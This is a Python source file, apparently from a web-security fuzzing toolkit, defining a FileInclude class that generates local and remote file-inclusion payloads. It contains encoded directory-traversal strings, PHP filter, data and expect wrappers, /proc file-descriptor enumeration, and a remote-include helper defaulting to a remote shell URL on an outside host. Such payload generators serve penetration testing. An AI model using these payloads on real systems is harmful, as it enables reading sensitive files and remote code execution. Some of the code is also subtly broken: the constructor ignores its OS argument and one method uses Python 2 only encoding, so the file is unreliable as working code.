#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer
from saker.utils.paths import Paths


class FileInclude(Fuzzer):

    """sensitive File"""

    generalports = [20, 21, 80]

    phpext = [
        'php',
        'php2',
        'php3',
        'php4',
        'php5',
        'php6',
        'php7',
        'pht',
        'phtml',
        'shtml'
    ]

    phpwrappers = [
        'file',
        'http',
        'ftp',
        'php',
        'zlib',
        'data',
        'glob',
        'phar'
    ]

    ups = [
        "../",
        "..\\",
        "..\\/",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "%c0%ae%c0%ae%c0%af",
        "%uff0e%uff0e%u2215",
        "%uff0e%uff0e%u2216",
        "\u002e\u002e\u2215",
        "\u002e\u002e\u2216",
        "..././",
        "...\\.\\",
        "..;/",
    ]

    dots = [
        ".",
        "\u002e",
        "%c0%2e",
        "%c0%ae",
        "%e0%40%ae",
    ]

    slashes = [
        "/",
        "\u2215",
        "%c0%af",
        "%c0%2f",
        "%e0%80%af",
    ]

    backslashes = [
        "/",
        "\u2216",
        "%c0%5c",
        "%c0%80%5c",
    ]

    terminator = [
        "\x00",
        "#",
        "?",
    ]
    # windows max dir length
    winmax = 259

    # linux max dir length
    linuxmax = 4096

    def __init__(self, os='linux'):
        super(FileInclude, self).__init__()
        self.os = 'linux'

    @property
    def sep(self):
        if self.os == 'windows':
            return '\\'
        else:
            return '/'

    @staticmethod
    def traverse(cnt=8, path="../"):
        return path * cnt

    @staticmethod
    def fakeProtocol(type, msg=""):
        if type == "php":
            return "php://input"
        elif type == "rot13":
            return "php://filter/read=string.rot13/resource=" + msg
        elif type == "phpb64":
            return "php://filter/convert.base64-encode/resource=" + msg
        elif type == "zlib64":
            return "php://filter/zlib.deflate/convert.base64-encode/resource=" + msg
        elif type == "textb64":
            return "data://text/plain;base64," + msg.encode("base64")
        elif type == "text":
            return "data://text/plain," + msg
        elif type == "expect":
            return "expect://" + msg
        elif type == "zip":
            return ["zip://", "bzip2://", "zlib://"][0] + msg

    @staticmethod
    def specialChar():
        return [
            ":",
            ".",
            "..",
            ";",
            "\x00",
            "\x01",
            "\\",
            "../",
            "..//",
            "\\..",
        ]

    @classmethod
    def proc(cls, minpid=1, maxpid=65535, minfd=1, maxfd=4096):
        for pid in range(minpid, maxpid + 1):
            for fd in range(minfd, maxfd + 1):
                yield f'/proc/{pid}/fd/{fd}'

    def list(self, userpath=""):
        if self.os == 'windows':
            path = Paths.windowsfile
        else:
            path = Paths.linuxfile
        with open(path) as pathes:
            for p in pathes:
                if p == "\n":
                    continue
                elif p.startswith("# "):
                    continue
                if userpath != "":
                    p = p.replace("~", userpath)
                yield p.strip("\n")

    def rfi(self, remote='http://site.com/shell.txt'):
        return remote

    def fuzz(self, data='', upcnt=8):
        for file in self.list():
            for up in self.ups:
                yield self.parent(data) + self.sep + up * upcnt + file

    def parent(self, s):
        return self.join(self.split(s)[:-1])

    def split(self, s):
        return s.split(self.sep)

    def join(self, s):
        return self.sep.join(s)
